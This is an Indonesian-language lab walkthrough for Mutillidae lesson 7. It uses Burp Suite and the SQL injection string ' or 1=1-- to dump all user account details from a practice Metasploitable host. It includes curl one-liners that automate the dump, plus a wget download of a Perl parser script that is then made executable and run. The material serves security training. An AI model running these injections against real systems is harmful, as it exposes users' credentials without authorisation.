#### LESSON 7

1. Membuka halaman mutillidae dengan memasukkan url `IPmetasploit/mutillidae` kemudian masuk ke user info seperti gambar berikut :
![](Mutillidae%20lesson%207/mutillidae%201.png)

2. Setting networks pada mozilla di kali linuk seperti pada gambar : 
![](Mutillidae%20lesson%207/mutillidae%202.png)

3. Kemudian buka burpsuite, setelah itu cek proxy dan klik `intercept is on` seperti pada gambar : 
![](Mutillidae%20lesson%207/mutillidae%203.png)

![](Mutillidae%20lesson%207/mutillidae%204.png)

4. Isi dengan name `' or 1=1-- ` kemudian klik `View Account Details` (jangan lupa memberikan spasi setelah tanda `--`).

5. Hasilnya : 
![](Mutillidae%20lesson%207/mutillidae%205.png)

6. Buka aplikasi burpsuite pilih tab proxy, lalu http history, cari host `IPmetasploit`, method `get`, URL `/mutillidae/index.php?page=user-info..` seperti pada gambar berikut : 
![](Mutillidae%20lesson%207/mutillidae%206.png)

7. Buka terminal lalu ketik `curl -b crack_cookies.txt -c crack_cookies.txt -A "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" -d "page=user-info.php&username=%27+or+1%3D1--+&password=&user-info-php-submit-button=View+Account+Details" -L "http://10.0.1.100/mutillidae/index.php" | grep -i "Username=" | awk 'BEGIN{FS="<"}{for (i=1; i<=NF; i++) print $i}' | awk -F\> '{print $2}'` (perhatikan jika sudah memiliki file crack_cookies.txt sebelumnya harus dihapus terlebih dahulu ) 
![](Mutillidae%20lesson%207/mutillidae%207.png)

8. setelah itu ketik `curl -b crack_cookies.txt -c crack_cookies.txt -A "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" -d "page=user-info.php&username=%27+or+1%3D1--+&password=&user-info-php-submit-button=View+Account+Details" -L "http://10.0.1.100/mutillidae/index.php" | grep "Username=" > lesson7.txt` 
![](Mutillidae%20lesson%207/mutillidae%208.png)

9. kemudian download output parser di : `wget http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson7/lesson7.pl.TXT`

10. setelah itu ketik `mv lesson7.pl.TXT lesson7.pl` dan `chmod 700 lesson7.pl`

11. kemudian ketik `./lesson7.pl` 
![](Mutillidae%20lesson%207/mutillidae%2010.png)
